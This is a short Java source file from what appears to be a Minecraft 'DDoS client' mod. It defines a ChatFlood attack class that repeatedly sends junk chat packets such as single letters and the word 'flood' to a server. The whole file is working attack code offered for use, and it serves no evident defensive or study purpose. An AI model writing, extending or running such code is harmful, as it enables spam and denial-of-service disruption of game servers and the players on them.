package com.ddosclient.attack.attacks;

import net.minecraft.client.MinecraftClient;
import net.minecraft.network.packet.c2s.play.ChatMessageC2SPacket;

import java.time.Instant;
import java.util.Optional;

public class ChatFlood extends BaseAttack {
    private static final String[] messages = {
        "a", "b", "c", "d", "e", "flood", "test", "x", ".", " "
    };
    private int index = 0;

    @Override
    public void execute(MinecraftClient mc) {
        if (mc.getNetworkHandler() == null) return;
        String msg = messages[index % messages.length];
        index++;
        mc.getNetworkHandler().sendPacket(new ChatMessageC2SPacket(
            msg,
            Instant.now(),
            0L,
            null,
            new net.minecraft.network.message.ArgumentSignatureDataMap(java.util.List.of())
        ));
    }
}
